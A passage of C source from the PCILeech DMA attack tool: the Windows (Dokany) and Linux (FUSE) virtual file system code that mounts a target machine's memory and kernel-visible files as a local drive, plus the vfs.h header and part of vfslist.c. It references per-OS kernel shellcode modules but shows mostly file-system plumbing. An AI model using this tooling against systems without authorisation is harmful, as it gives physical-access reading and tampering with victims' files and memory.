    hfi->ftLastWriteTime = VfsEntry.ftLastWriteTime;
    hfi->nFileSizeHigh = (DWORD)(VfsEntry.cbFileSize >> 32);
    hfi->nFileSizeLow = (DWORD)(VfsEntry.cbFileSize);
    hfi->nFileIndexHigh = CharUtil_Hash32U(uszFullPath, TRUE);
    hfi->nFileIndexLow = CharUtil_Hash32U(VfsEntry.uszName, TRUE);
    return STATUS_SUCCESS;
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_GetFileInformation(_In_ LPCWSTR wcsFileName, _Inout_ LPBY_HANDLE_FILE_INFORMATION hfi, _In_ PDOKAN_FILE_INFO DokanFileInfo)
{
    LPSTR uszPathFull;
    BYTE pbBuffer[3 * MAX_PATH];
    if(!CharUtil_WtoU((LPWSTR)wcsFileName, -1, pbBuffer, sizeof(pbBuffer), &uszPathFull, NULL, 0)) { return STATUS_FILE_INVALID; }
    return VfsDokanCallback_GetFileInformation_Impl(uszPathFull, hfi, DokanFileInfo);
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_FindFiles(LPCWSTR wcsFileName, PFillFindData FillFindData, PDOKAN_FILE_INFO DokanFileInfo)
{
    VfsList_ListDirectoryW((LPWSTR)wcsFileName, DokanFileInfo, (PFN_VFSLISTW_CALLBACK)FillFindData);
    return STATUS_SUCCESS;
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_ReadFile(LPCWSTR wcsFileName, LPVOID Buffer, DWORD BufferLength, LPDWORD ReadLength, LONGLONG Offset, PDOKAN_FILE_INFO DokanFileInfo)
{
    LPSTR uszPathFull;
    BYTE pbBuffer[3 * MAX_PATH];
    if(!CharUtil_WtoU((LPWSTR)wcsFileName, -1, pbBuffer, sizeof(pbBuffer), &uszPathFull, NULL, 0)) { return STATUS_FILE_INVALID; }
    return VfsRead(uszPathFull, Buffer, BufferLength, ReadLength, Offset);
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_WriteFile(LPCWSTR wcsFileName, LPCVOID Buffer, DWORD NumberOfBytesToWrite, LPDWORD NumberOfBytesWritten, LONGLONG Offset, PDOKAN_FILE_INFO DokanFileInfo)
{
    LPSTR uszPathFull;
    BYTE pbBuffer[3 * MAX_PATH];
    if(!CharUtil_WtoU((LPWSTR)wcsFileName, -1, (PBYTE)pbBuffer, sizeof(pbBuffer), &uszPathFull, NULL, 0)) { return STATUS_FILE_INVALID; }
    return VfsWrite(DokanFileInfo->WriteToEndOfFile, uszPathFull, (PBYTE)Buffer, NumberOfBytesToWrite, NumberOfBytesWritten, Offset);
}

NTSTATUS DOKAN_CALLBACK
VfsDokanCallback_DeleteFile(LPCWSTR wcsFileName, PDOKAN_FILE_INFO DokanFileInfo)
{
    LPSTR uszPathFull;
    BYTE pbBuffer[3 * MAX_PATH];
    if(!CharUtil_WtoU((LPWSTR)wcsFileName, -1, pbBuffer, sizeof(pbBuffer), &uszPathFull, NULL, 0)) { return STATUS_FILE_INVALID; }
    VfsDelete(uszPathFull);
    return STATUS_SUCCESS;
}

VOID DOKAN_CALLBACK
VfsDokanCallback_Cleanup(LPCWSTR wcsFileName, PDOKAN_FILE_INFO DokanFileInfo)
{
    LPSTR uszPathFull;
    BYTE pbBuffer[3 * MAX_PATH];
    if(DokanFileInfo->DeleteOnClose && !DokanFileInfo->IsDirectory) {
        if(!CharUtil_WtoU((LPWSTR)wcsFileName, -1, pbBuffer, sizeof(pbBuffer), &uszPathFull, NULL, 0)) { return; }
        VfsDelete(uszPathFull);
    }
}

VOID ActionUnMount()
{
    if(ctxMain->vfs.fInitialized) {
        ctxMain->vfs.fInitialized = FALSE;
        if(ctxMain->vfs.pfnDokanUnmount) {
            ctxMain->vfs.pfnDokanUnmount(ctxMain->vfs.wchMountPoint);
            Sleep(50);
        }
    }
}

VOID ActionMount()
{
    int status;
    HMODULE hModuleDokan = NULL;
    PVFS_GLOBAL_STATE pVfsState = NULL;
    PDOKAN_OPTIONS pDokanOptions = NULL;
    PDOKAN_OPERATIONS pDokanOperations = NULL;
    WCHAR wszMountPoint[] = { 'K', ':', '\\', 0 };
    VOID(WINAPI *pfnDokanInit)();
    int(WINAPI *pfnDokanMain)(PDOKAN_OPTIONS, PDOKAN_OPERATIONS);
    VOID(WINAPI *pfnDokanShutdown)();
    // sanity checks
    if(!ctxMain->phKMD && (PCILEECH_DEVICE_EQUALS("usb3380") || (ctxMain->cfg.paAddrMax > 0x0000040000000000) || (ctxMain->cfg.paAddrMax < 0x00400000))) {
        printf(
            "MOUNT: Failed. Please see below for possible reasons:               \n" \
            "   - Mounting file system requires an active kernel module (KMD).   \n" \
            "   - Mounting kernel backed RAM of target system requires a KMD.    \n" \
            "   - Mounting native RAM of target system requires FPGA hardware    \n" \
            "     and KMD or valid -max option set.                              \n"
        );
        goto fail;
    }
    if(!ctxMain->phKMD) { printf("MOUNT: INFO: FILES folder not mounted. (No kernel module loaded).\n"); }
    // allocate
    hModuleDokan = LoadLibraryExA("dokan2.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    pfnDokanInit = (VOID(WINAPI*)())GetProcAddress(hModuleDokan, "DokanInit");
    pfnDokanMain = (int(WINAPI*)(PDOKAN_OPTIONS, PDOKAN_OPERATIONS))GetProcAddress(hModuleDokan, "DokanMain");
    pfnDokanShutdown = (VOID(WINAPI*)())GetProcAddress(hModuleDokan, "DokanShutdown");
    if(!hModuleDokan || !pfnDokanMain || !pfnDokanInit || !pfnDokanShutdown) {
        printf("MOUNT: Failed. The required DOKANY file system library is not installed. \n");
        printf("Please download from : https://github.com/dokan-dev/dokany/releases/latest\n");
        goto fail;
    }
    pVfsState = (PVFS_GLOBAL_STATE)LocalAlloc(LMEM_ZEROINIT, sizeof(VFS_GLOBAL_STATE));
    pDokanOptions = (PDOKAN_OPTIONS)LocalAlloc(LMEM_ZEROINIT, sizeof(DOKAN_OPTIONS));
    pDokanOperations = (PDOKAN_OPERATIONS)LocalAlloc(LMEM_ZEROINIT, sizeof(DOKAN_OPERATIONS));
    if(!pVfsState || !pDokanOptions || !pDokanOperations) {
        printf("MOUNT: Failed (out of memory).\n");
        goto fail;
    }
    // set global state
    pVfsState->cbKmd = ctxMain->phKMD ? (ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].BaseAddress + ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].NumberOfBytes) : 0;
    pVfsState->cbNative = PCILEECH_DEVICE_EQUALS("usb3380") ? 0 : (ctxMain->phKMD ? pVfsState->cbKmd : ctxMain->cfg.paAddrMax);
    pVfsState->DokanNtStatusFromWin32 = (NTSTATUS(*)(DWORD))GetProcAddress(hModuleDokan, "DokanNtStatusFromWin32");
    pVfsState->PCILeechOperatingSystem = ctxMain->phKMD ? ctxMain->pk->OperatingSystem : 0;
    if(pVfsState->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_WINDOWS) {
        strcpy_s(pVfsState->szNameVfsShellcode, 32, "DEFAULT_WINX64_VFS_KSH");
    } else if(pVfsState->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_LINUX) {
        strcpy_s(pVfsState->szNameVfsShellcode, 32, "DEFAULT_LINUX_X64_VFS_KSH");
    } else if(pVfsState->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_MACOS) {
        strcpy_s(pVfsState->szNameVfsShellcode, 32, "DEFAULT_MACOS_VFS_KSH");
    } else if(ctxMain->phKMD) {
        printf("MOUNT: Operating system not supported.\n");
        goto fail;
    }
    InitializeCriticalSection(&pVfsState->Lock);
    SYSTEMTIME SystemTimeNow;
    GetSystemTime(&SystemTimeNow);
    SystemTimeToFileTime(&SystemTimeNow, &pVfsState->ftDefaultTime);
    g_vfs = pVfsState;
    // set options
    pDokanOptions->Version = DOKAN_VERSION;
    pDokanOptions->Options |= DOKAN_OPTION_NETWORK;
    pDokanOptions->UNCName = L"PCILeechFileSystem";
    if((ctxMain->cfg.szMount[0] >= 'a' && ctxMain->cfg.szMount[0] <= 'z') || (ctxMain->cfg.szMount[0] >= 'A' && ctxMain->cfg.szMount[0] <= 'Z')) {
        wszMountPoint[0] = ctxMain->cfg.szMount[0];
    }
    pDokanOptions->MountPoint = wszMountPoint;
    pDokanOptions->Timeout = 60000;
    // set callbacks
    pDokanOperations->ZwCreateFile = VfsDokanCallback_CreateFile;
    pDokanOperations->Cleanup = VfsDokanCallback_Cleanup;
    pDokanOperations->DeleteFileW = VfsDokanCallback_DeleteFile;
    pDokanOperations->GetFileInformation = VfsDokanCallback_GetFileInformation;
    pDokanOperations->FindFiles = VfsDokanCallback_FindFiles;
    pDokanOperations->ReadFile = VfsDokanCallback_ReadFile;
    pDokanOperations->WriteFile = VfsDokanCallback_WriteFile;
    // enable directory caching sub-system
    if(!VfsList_Initialize(VfsListU, 500, 0x1000, TRUE)) {
        printf("MOUNT: Unable to initialize directory cache.\n");
        goto fail;
    }
    // enable
    printf(
        "MOUNTING PCILEECH FILE SYSTEM:                                                 \n" \
        "===============================================================================\n");
    if(ctxMain->phKMD) {
        printf(
            "PCILeech DMA attack target file system is mounted in the /files/ folder.       \n" \
            "Please see limitations below:                                                  \n" \
            " - Kernel module is required and is supported on: Windows, Linux and macOS.    \n" \
            " - Create file: not implemented.                                               \n" \
            " - Write to files may be buggy and may in rare cases corrupt the target file.  \n" \
            " - Delete file will most often work, but with errors.                          \n" \
            " - Delete directory, rename/move file and other features may not be supported. \n" \
            "===============================================================================\n");
    }
    printf("MOUNT: Mounting as drive %S\n", pDokanOptions->MountPoint);
    ctxMain->vfs.pfnDokanUnmount = (BOOL(WINAPI*)(WCHAR))GetProcAddress(hModuleDokan, "DokanUnmount");
    ctxMain->vfs.wchMountPoint = wszMountPoint[0];
    ctxMain->vfs.fInitialized = TRUE;
    pfnDokanInit();
    status = pfnDokanMain(pDokanOptions, pDokanOperations);
    while(ctxMain && ctxMain->vfs.fInitialized && (status == DOKAN_SUCCESS)) {
        printf("MOUNT: ReMounting as drive %S\n", pDokanOptions->MountPoint);
        status = pfnDokanMain(pDokanOptions, pDokanOperations);
    }
    pfnDokanShutdown();
    printf("MOUNT: Failed. Status Code: %i\n", status);
    DeleteCriticalSection(&pVfsState->Lock);
fail:
    if(hModuleDokan) { FreeLibrary(hModuleDokan); }
    g_vfs = NULL;
    if(pVfsState) {
        DeleteCriticalSection(&pVfsState->Lock);
        LocalFree(pVfsState);
    }
    LocalFree(pDokanOptions);
    LocalFree(pDokanOperations);
}

#endif /* _WIN32 */



#ifdef LINUX

//-------------------------------------------------------------------------------
// LINUX-ONLY functions including FUSE CALLBACK functions.
//-------------------------------------------------------------------------------

#define FILETIME_TO_UNIX(ft)        (time_t)((ft) / 10000000ULL - 11644473600ULL)
#define VER_OSARCH                  "Linux"

static int vfs_getattr(const char* uszPathFull, struct stat *st)
{
    DWORD i = 0;
    CHAR c = 0, uszPathCopy[3 * MAX_PATH] = { 0 };
    CHAR uszPath[3 * MAX_PATH];
    LPSTR uszFile;
    BOOL result, fIsDirectoryExisting;
    VFS_ENTRY e;
    // 1: replace forward slash with backward slash
    strncpy_s(uszPathCopy, sizeof(uszPathCopy), uszPathFull, _TRUNCATE);
    while((c = uszPathCopy[i++])) {
        if(c == '/') { uszPathCopy[i - 1] = '\\'; }
    }
    // 2: set common values:
    st->st_uid = getuid();
    st->st_gid = getgid();
    // 3: matches: root directory
    if(!strcmp(uszPathCopy, "\\")) {
        st->st_ctime = time(NULL);
        st->st_mtime = time(NULL);
        st->st_atime = time(NULL);
        st->st_mode = S_IFDIR | 0755;
        st->st_nlink = 2;
        return 0;
    }
    // 4: matches vfs file/directory:
    uszFile = CharUtil_PathSplitLastEx(uszPathCopy, uszPath, sizeof(uszPath));
    result = VfsList_GetSingle((uszPath[0] ? uszPath : "\\"), uszFile, &e, &fIsDirectoryExisting);
    if(result) {
        st->st_ctime = FILETIME_TO_UNIX(e.ftCreationTime);
        st->st_mtime = FILETIME_TO_UNIX(e.ftLastWriteTime);
        st->st_atime = FILETIME_TO_UNIX(e.ftLastAccessTime);
        if(e.fDirectory) {
            st->st_mode = S_IFDIR | 0755;
            st->st_nlink = 2;
        } else {
            st->st_mode = S_IFREG | 0644;
            st->st_nlink = 1;
            st->st_size = e.cbFileSize;
        }
    }
    return 0;
}

typedef struct td_readdir_cb_ctx {
    void* buffer;
    fuse_fill_dir_t filler;
} readdir_cb_ctx, * preaddir_cb_ctx;

static void vfs_readdir_cb(_In_ PVFS_ENTRY pVfsEntry, _In_opt_ preaddir_cb_ctx ctx)
{
    ctx->filler(ctx->buffer, pVfsEntry->uszName, NULL, 0);
}

static int vfs_readdir(const char* uszPath, void* buffer, fuse_fill_dir_t filler, off_t offset, struct fuse_file_info *fi)
{
    DWORD i = 0;
    CHAR c = 0, uszPathCopy[3 * MAX_PATH] = { 0 };
    UNREFERENCED_PARAMETER(offset);
    UNREFERENCED_PARAMETER(fi);
    // 1: replace forward slash with backward slash
    strncpy_s(uszPathCopy, sizeof(uszPathCopy), uszPath, _TRUNCATE);
    while((c = uszPathCopy[i++])) {
        if(c == '/') { uszPathCopy[i - 1] = '\\'; }
    }
    // 2: do work
    readdir_cb_ctx ctx;
    ctx.buffer = buffer;
    ctx.filler = filler;
    filler(buffer, ".", NULL, 0);
    filler(buffer, "..", NULL, 0);
    VfsList_ListDirectory(uszPathCopy, &ctx, (void(*)(PVFS_ENTRY, PVOID))vfs_readdir_cb);
    return 0;
}

static int vfs_read(const char* uszPath, char* buffer, size_t size, off_t offset, struct fuse_file_info *fi)
{
    NTSTATUS nt;
    DWORD i = 0, readlength = 0;
    CHAR c = 0, uszPathCopy[3 * MAX_PATH] = { 0 };
    UNREFERENCED_PARAMETER(fi);
    // 1: replace forward slash with backward slash
    strncpy_s(uszPathCopy, sizeof(uszPathCopy), uszPath, _TRUNCATE);
    while((c = uszPathCopy[i++])) {
        if(c == '/') { uszPathCopy[i - 1] = '\\'; }
    }
    // 2: read
    nt = VfsRead(uszPathCopy, (PBYTE)buffer, size, &readlength, offset);
    return ((nt == STATUS_SUCCESS) || (nt == STATUS_END_OF_FILE)) ? (int)readlength : 0;
}

static int vfs_truncate(const char* path, off_t size)
{
    // dummy function - required and called before vfs_write().
    UNREFERENCED_PARAMETER(path);
    UNREFERENCED_PARAMETER(size);
    return 0;
}

static int vfs_write(const char* uszPath, const char* buffer, size_t size, off_t offset, struct fuse_file_info *fi)
{
    NTSTATUS nt;
    DWORD i = 0, writelength = 0;
    CHAR c = 0, uszPathCopy[3 * MAX_PATH] = { 0 };
    UNREFERENCED_PARAMETER(fi);
    // 1: replace forward slash with backward slash
    strncpy_s(uszPathCopy, sizeof(uszPathCopy), uszPath, _TRUNCATE);
    while((c = uszPathCopy[i++])) {
        if(c == '/') { uszPathCopy[i - 1] = '\\'; }
    }
    // 2: write
    nt = VfsWrite(FALSE, uszPathCopy, (PBYTE)buffer, size, &writelength, offset);
    return ((nt == STATUS_SUCCESS) || (nt == STATUS_END_OF_FILE)) ? (int)size : 0;
}

static struct fuse_operations vfs_operations = {
    .readdir = vfs_readdir,
    .getattr = vfs_getattr,
    .read = vfs_read,
    .write = vfs_write,
    .truncate = vfs_truncate,
};

void vfs_initialize_and_mount_displayinfo()
{
    PVFS_GLOBAL_STATE pVfsState = NULL;
    void* hlibfuse2 = NULL;
    int(*pfn_fuse_main_real)(int argc, char** argv, const struct fuse_operations* op, size_t op_size, void* private_data);
    // sanity check
    if(ctxMain->cfg.szMount[0] != '/') {
        printf("MOUNT: Failed - missing required option '-mount <fullpath>' or not full mount path given.\n");
        goto fail;
    }
    // set global state
    pVfsState = (PVFS_GLOBAL_STATE)LocalAlloc(LMEM_ZEROINIT, sizeof(VFS_GLOBAL_STATE));
    if(!pVfsState) {
        printf("MOUNT: Failed (out of memory).\n");
        goto fail;
    }
    pVfsState->cbKmd = ctxMain->phKMD ? (ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].BaseAddress + ctxMain->phKMD->pPhysicalMap[ctxMain->phKMD->cPhysicalMap - 1].NumberOfBytes) : 0;
    pVfsState->cbNative = PCILEECH_DEVICE_EQUALS("usb3380") ? 0 : (ctxMain->phKMD ? pVfsState->cbKmd : ctxMain->cfg.paAddrMax);
    pVfsState->PCILeechOperatingSystem = ctxMain->phKMD ? ctxMain->pk->OperatingSystem : 0;
    if(pVfsState->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_WINDOWS) {
        strcpy_s(pVfsState->szNameVfsShellcode, 32, "DEFAULT_WINX64_VFS_KSH");
    } else if(pVfsState->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_LINUX) {
        strcpy_s(pVfsState->szNameVfsShellcode, 32, "DEFAULT_LINUX_X64_VFS_KSH");
    } else if(pVfsState->PCILeechOperatingSystem == KMDDATA_OPERATING_SYSTEM_MACOS) {
        strcpy_s(pVfsState->szNameVfsShellcode, 32, "DEFAULT_MACOS_VFS_KSH");
    } else if(ctxMain->phKMD) {
        printf("MOUNT: Operating system not supported.\n");
        goto fail;
    }
    InitializeCriticalSection(&pVfsState->Lock);
    pVfsState->ftDefaultTime = (time(NULL) * 10000000) + 116444736000000000;
    g_vfs = pVfsState;
    // enable directory caching sub-system
    if(!VfsList_Initialize(VfsListU, 500, 0x1000, TRUE)) {
        printf("MOUNT: Unable to initialize directory cache.\n");
        goto fail;
    }
    // dynamically load fuse (to avoid runtime dependency)
    hlibfuse2 = dlopen("libfuse.so.2", RTLD_NOW);
    if(!hlibfuse2) {
        printf("MOUNT: Unable to load required FUSE file system library libfuse.so.2\n");
        goto fail;
    }
    pfn_fuse_main_real = dlsym(hlibfuse2, "fuse_main_real");
    if(!pfn_fuse_main_real) {
        printf("MOUNT: Unable to load fetch required function pfn_fuse_main_real from FUSE file system library\n");
        goto fail;
    }
    // enable
    printf(
        "MOUNTING PCILEECH FILE SYSTEM:                                                 \n" \
        "===============================================================================\n");
    if(ctxMain->phKMD) {
        printf(
            "PCILeech DMA attack target file system is mounted in the <mnt>/files/ folder.  \n" \
            "Please see limitations below:                                                  \n" \
            " - Kernel module is required and is supported on: Windows, Linux and macOS.    \n" \
            " - Create file: not implemented.                                               \n" \
            " - Write to files may be buggy and may in rare cases corrupt the target file.  \n" \
            " - Delete file will most often work, but with errors.                          \n" \
            " - Delete directory, rename/move file and other features may not be supported. \n" \
            "===============================================================================\n");
    }
    printf("MOUNT: Mounting at path '%s'\n", ctxMain->cfg.szMount);
    // hand over control to FUSE.
    LPSTR szArgListFuse[] = { ctxMain->argv[0], ctxMain->cfg.szMount, "-f" };
    pfn_fuse_main_real(3, szArgListFuse, &vfs_operations, sizeof(vfs_operations), NULL);
fail:
    g_vfs = NULL;
    if(pVfsState) {
        DeleteCriticalSection(&pVfsState->Lock);
        LocalFree(pVfsState);
    }
    if(hlibfuse2) {
        dlclose(hlibfuse2);
    }
}

VOID ActionUnMount()
{
    return;
}

VOID ActionMount()
{
    vfs_initialize_and_mount_displayinfo();
}

#endif /* LINUX */

```

`pcileech/vfs.h`:

```h
// vfs.h : definitions related to virtual file system support.
//
// (c) Ulf Frisk, 2017-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifndef __VFS_H__
#define __VFS_H__
#include "pcileech.h"
#include "oscompatibility.h"

#define VFS_FLAGS_FILE_NORMAL           0x01
#define VFS_FLAGS_FILE_DIRECTORY        0x02
#define VFS_FLAGS_FILE_SYMLINK          0x04
#define VFS_FLAGS_FILE_OTHER            0x08
#define VFS_FLAGS_UNICODE               0x10
#define VFS_FLAGS_EXIST_FILE            0x20
#define VFS_FLAGS_TRUNCATE_ON_WRITE     0x40
#define VFS_FLAGS_APPEND_ON_WRITE       0x80

typedef struct tdVFS_RESULT_FILEINFO {
    QWORD flags;
    QWORD tAccessOpt;
    QWORD tModifyOpt;
    QWORD tCreateOpt;
    QWORD dbg1;
    QWORD dbg2;
    QWORD cb;
    WCHAR wszFileName[MAX_PATH];
} VFS_RESULT_FILEINFO, *PVFS_RESULT_FILEINFO;

/*
* Unmount a mounted virtual file system.
*/
VOID ActionUnMount();

/*
* Mount a drive backed by PCILeech virtual file system. The mounted file system
* will contain both a memory mapped ram files and the file system as seen from
* the target system kernel. NB! This action requires a loaded kernel module and
* that the Dokany file system library and driver have been installed. Please
* see: https://github.com/dokan-dev/dokany/releases
* -- pDeviceData
*/
VOID ActionMount();

#endif /* __VFS_H__ */

```

`pcileech/vfslist.c`:

```c
// vfslist.h : definitions related to vfs directory listings.
//
// (c) Ulf Frisk, 2021-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "vfslist.h"
#include "ob/ob.h"
#include "charutil.h"

typedef struct tdVFSLIST_CONTEXT {
    QWORD qwCacheValidMs;
    FILETIME ftDefaultTime;
    time_t time_default;
    POB_CACHEMAP pcm;
    VFS_LIST_U_PFN pfnVfsListU;
    BOOL fSingleThread;
    CRITICAL_SECTION Lock;
} VFSLIST_CONTEXT, *PVFSLIST_CONTEXT;

VFSLIST_CONTEXT g_ctxVfsList = { 0 };

#define VFSLIST_CONFIG_FILELIST_ITEMS   12
#define VFSLIST_CONFIG_FILELIST_MAGIC   0x7f646555caffee66

typedef struct tdVFSLIST_DIRECTORY {
    QWORD magic;
    struct tdVFSLIST_DIRECTORY *FLink;
    DWORD cFiles;
    VFS_ENTRY pFilesU[VFSLIST_CONFIG_FILELIST_ITEMS];
} VFSLIST_DIRECTORY, *PVFSLIST_DIRECTORY;

typedef struct tdVFSLISTOB_DIRECTORY {
    OB ObHdr;
    QWORD tc64;
    QWORD qwHash;
    VFSLIST_DIRECTORY Dir;
} VFSLISTOB_DIRECTORY, *PVFSLISTOB_DIRECTORY;

/*
* Object Manager cleanup callback function.
*/
VOID VfsList_CallbackCleanup_ObDirectory(PVFSLISTOB_DIRECTORY pObDir)
{
    PVFSLIST_DIRECTORY pDirNext, pDir = pObDir->Dir.FLink;
    while(pDir) {
        pDirNext = pDir->FLink;
        LocalFree(pDir);
        pDir = pDirNext;
    }
}

#define VFSLIST_ASCII      "________________________________ !_#$%&'()_+,-._0123456789_;_=__@ABCDEFGHIJKLMNOPQRSTUVWXYZ[_]^_`abcdefghijklmnopqrstuvwxyz{_}~ "

VOID VfsList_AddDirectoryFileInternal(_Inout_ PVFSLIST_DIRECTORY pFileList, _In_ DWORD dwFileAttributes, _In_ FILETIME ftCreationTime, _In_ FILETIME ftLastAccessTime, _In_ FILETIME ftLastWriteTime, _In_ QWORD cbFileSize, _In_ LPSTR uszName)
{
    WCHAR c;
    DWORD i = 0;
    PVFS_ENTRY pe;
    // 1: check if required to allocate more FileList items
    while(pFileList->cFiles == VFSLIST_CONFIG_FILELIST_ITEMS) {
        if(pFileList->FLink) {
            pFileList = pFileList->FLink;
            continue;
        }
        pFileList->FLink = LocalAlloc(LMEM_ZEROINIT, sizeof(VFSLIST_DIRECTORY));
        if(!pFileList->FLink) { return; }
        pFileList = pFileList->FLink;
    }
    // 2: locate item to fill into
    pe = pFileList->pFilesU + pFileList->cFiles;
    pFileList->cFiles++;
    // 3: fill entry
    pe->fDirectory = (dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;
    pe->dwFileAttributes = dwFileAttributes;
    pe->ftCreationTime = ftCreationTime;
    pe->ftLastAccessTime = ftLastAccessTime;
    pe->ftLastWriteTime = ftLastWriteTime;
    pe->cbFileSize = cbFileSize;
    CharUtil_UtoU(uszName, -1, (PBYTE)pe->uszName, sizeof(pe->uszName), NULL, NULL, CHARUTIL_FLAG_TRUNCATE_ONFAIL_NULLSTR | CHARUTIL_FLAG_STR_BUFONLY);
    while((i < sizeof(pe->uszName)) && (c = pe->uszName[i])) {
        pe->uszName[i++] = (c < 128) ? VFSLIST_ASCII[c] : c;
    }
}

VOID VfsList_AddFile(_Inout_ HANDLE hFileList, _In_ LPSTR uszName, _In_ QWORD cb, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo)
{
    PVFSLIST_DIRECTORY pFileList2 = (PVFSLIST_DIRECTORY)hFileList;
    BOOL fExInfo = pExInfo && (pExInfo->dwVersion == VMMDLL_VFS_FILELIST_EXINFO_VERSION);
    if(pFileList2 && (pFileList2->magic == VFSLIST_CONFIG_FILELIST_MAGIC)) {
        VfsList_AddDirectoryFileInternal(
            pFileList2,
            FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | ((fExInfo && pExInfo->fCompressed) ? FILE_ATTRIBUTE_COMPRESSED : 0),
            (fExInfo && pExInfo->qwCreationTime) ? pExInfo->ftCreationTime : g_ctxVfsList.ftDefaultTime,
            (fExInfo && pExInfo->qwLastAccessTime) ? pExInfo->ftLastAccessTime : g_ctxVfsList.ftDefaultTime,
            (fExInfo && pExInfo->qwLastWriteTime) ? pExInfo->ftLastWriteTime : g_ctxVfsList.ftDefaultTime,
            cb,
            uszName
        );
    }
}

VOID VfsList_AddDirectory(_Inout_ HANDLE hFileList, _In_ LPSTR uszName, _In_opt_ PVMMDLL_VFS_FILELIST_EXINFO pExInfo)
{
    PVFSLIST_DIRECTORY pFileList2 = (PVFSLIST_DIRECTORY)hFileList;
    BOOL fExInfo = pExInfo && (pExInfo->dwVersion == VMMDLL_VFS_FILELIST_EXINFO_VERSION);
    if(pFileList2 && (pFileList2->magic == VFSLIST_CONFIG_FILELIST_MAGIC)) {
        VfsList_AddDirectoryFileInternal(
            pFileList2,
            FILE_ATTRIBUTE_DIRECTORY | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | ((fExInfo && pExInfo->fCompressed) ? FILE_ATTRIBUTE_COMPRESSED : 0),
            (fExInfo && pExInfo->qwCreationTime) ? pExInfo->ftCreationTime : g_ctxVfsList.ftDefaultTime,
            (fExInfo && pExInfo->qwLastAccessTime) ? pExInfo->ftLastAccessTime : g_ctxVfsList.ftDefaultTime,
            (fExInfo && pExInfo->qwLastWriteTime) ? pExInfo->ftLastWriteTime : g_ctxVfsList.ftDefaultTime,
            0,
            uszName
        );
    }
}

/*
* Retrieve a directory object given a path name.
* CALLER DECREF: return
* -- uszPath
* -- return
*/
PVFSLISTOB_DIRECTORY VfsList_GetDirectory(_In_ LPSTR uszPath)
{
    QWORD i = 0, qwHash;
    PVFSLISTOB_DIRECTORY pObDir = NULL;
    VMMDLL_VFS_FILELIST2 VfsFileList;
    CHAR c, uszPathCopy[3 * MAX_PATH];
    // 1: try fetch from cache:
    qwHash = CharUtil_HashPathFsU(uszPath);
    if((pObDir = ObCacheMap_GetByKey(g_ctxVfsList.pcm, qwHash))) {
        return pObDir;
    }
    if(g_ctxVfsList.fSingleThread) {
        EnterCriticalSection(&g_ctxVfsList.Lock);
        if((pObDir = ObCacheMap_GetByKey(g_ctxVfsList.pcm, qwHash))) {
            LeaveCriticalSection(&g_ctxVfsList.Lock);
            return pObDir;
        }
    }
    // 2: replace forward-slash with backward slash for MemProcFS compatibility
    strncpy_s(uszPathCopy, sizeof(uszPathCopy), uszPath, _TRUNCATE);
    while((c = uszPathCopy[i++])) {
        if(c == '/') { uszPathCopy[i - 1] = '\\'; }
    }
    // 3: create new:
    pObDir = Ob_Alloc('VFSD', LMEM_ZEROINIT, sizeof(VFSLISTOB_DIRECTORY), (VOID(*)(PVOID))VfsList_CallbackCleanup_ObDirectory, NULL);
    if(!pObDir) { goto fail; }
    pObDir->Dir.magic = VFSLIST_CONFIG_FILELIST_MAGIC;
    VfsFileList.dwVersion = VMMDLL_VFS_FILELIST_VERSION;
    VfsFileList.h = (HANDLE)&pObDir->Dir;
    VfsFileList.pfnAddFile = VfsList_AddFile;
    VfsFileList.pfnAddDirectory = VfsList_AddDirectory;
    if(g_ctxVfsList.pfnVfsListU(uszPathCopy, &VfsFileList)) {
        pObDir->tc64 = GetTickCount64();
        pObDir->qwHash = qwHash;
        ObCacheMap_Push(g_ctxVfsList.pcm, qwHash, pObDir, 0);
        if(g_ctxVfsList.fSingleThread) { LeaveCriticalSection(&g_ctxVfsList.Lock); }
        return pObDir;
    }
fail:
    if(g_ctxVfsList.fSingleThread) { LeaveCriticalSection(&g_ctxVfsList.Lock); }
    Ob_DECREF(pObDir);
    return NULL;
}

/*
* List a directory using a callback function
* -- uszPath
* -- ctx = optional context to pass along to callback function.
* -- pfnListCallback = callback function called one time per directory entry.
* -- return = TRUE if directory exists, otherwise FALSE.
*/
BOOL VfsList_ListDirectory(_In_ LPSTR uszPath, _In_opt_ PVOID ctx, _In_opt_ PFN_VFSLIST_CALLBACK pfnListCallback)
{
    DWORD i;
    PVFSLIST_DIRECTORY pDir;
    PVFSLISTOB_DIRECTORY pObDir;
    if(!(pObDir = VfsList_GetDirectory(uszPath))) { return FALSE; }
    if(pfnListCallback) {
        pDir = &pObDir->Dir;
        while(pDir) {
            for(i = 0; i < pDir->cFiles; i++) {
                pfnListCallback(pDir->pFilesU + i, ctx);
            }
            pDir = pDir->FLink;
        }
    }
    Ob_DECREF(pObDir);
    return TRUE;
}

/*
* Retrieve information about a single entry inside a directory.
* -- uszPath
* -- uszFile
* -- pVfsEntry
* -- pfPathValid = receives if wszPath is valid or not.
* -- return
*/
_Success_(return)
BOOL VfsList_GetSingle(_In_ LPSTR uszPath, _In_ LPSTR uszFile, _Out_ PVFS_ENTRY pVfsEntry, _Out_ PBOOL pfPathValid)
{
    DWORD i;
    PVFSLIST_DIRECTORY pDir;
    PVFSLISTOB_DIRECTORY pObDir;
    *pfPathValid = FALSE;
    if((pObDir = VfsList_GetDirectory(uszPath))) {
        *pfPathValid = TRUE;
        pDir = &pObDir->Dir;
        while(pDir) {
            for(i = 0; i < pDir->cFiles; i++) {
                if(!_stricmp(uszFile, pDir->pFilesU[i].uszName)) {
